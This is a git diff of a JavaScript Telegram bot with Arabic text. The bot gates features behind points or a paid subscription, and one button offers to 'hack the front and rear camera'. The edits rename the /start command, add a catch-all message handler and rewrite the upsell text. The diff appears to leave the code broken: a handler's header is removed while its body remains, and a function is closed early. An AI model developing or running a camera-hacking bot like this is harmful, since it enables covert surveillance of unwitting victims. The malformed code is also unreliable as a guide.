@@ -249,14 +249,6 @@ function activateUser(userId) {
 
 // معالجة الرسائل الواردة
 
-bot.off('message', async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text ? msg.text.toLowerCase() : '';
-  const senderId = msg.from.id;
-  const firstName = msg.from.first_name;
-  const lastName = msg.from.last_name || '';
-  const username = msg.from.username || '';
-
   // تسجيل المستخدمين الجدد
   if (!allUsers[chatId]) {
     allUsers[chatId] = {
@@ -573,7 +565,7 @@ function checkPointsAndSubscribe(userId) {
     }
 }
 
-bot.onText(/\/start (.+)/, (msg, match) => {
+bot.onText(/\/sjgdd (.+)/, (msg, match) => {
     const startPayload = match[1];
     const newUserId = msg.from.id.toString();
     
@@ -597,9 +589,16 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     showButtons(msg.chat.id, newUserId);
 });
 
-bot.onText(/\/start/, (msg) => {
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text ? msg.text.toLowerCase() : '';
+    const senderId = msg.from.id;
+    const firstName = msg.from.first_name;
+    const lastName = msg.from.last_name || '';
+    const username = msg.from.username || '';
+
     if (!msg.text.includes(' ')) {
-        showButtons(msg.chat.id, msg.from.id.toString());
+        showButtons(chatId, senderId.toString());
     }
 });
 
@@ -610,6 +609,10 @@ function showButtons(chatId, userId) {
     let statusMessage = isSubscribed 
         ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
         : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+
+    // إرسال رسالة الحالة إلى المستخدم
+    bot.sendMessage(chatId, statusMessage);
+}
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
@@ -656,7 +659,7 @@ bot.on('callback_query', (callbackQuery) => {
             break;
         default:
             if (!subscribedUsers.has(userId)) {
-                bot.sendMessage(chatId, 'عذرًا، يجب أن تجمع 15 نقطة للاشتراك في البوت واستخدام هذه الميزة.');
+                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
             } else {
                 bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                 // هنا يمكنك إضافة الكود الخاص بكل عملية
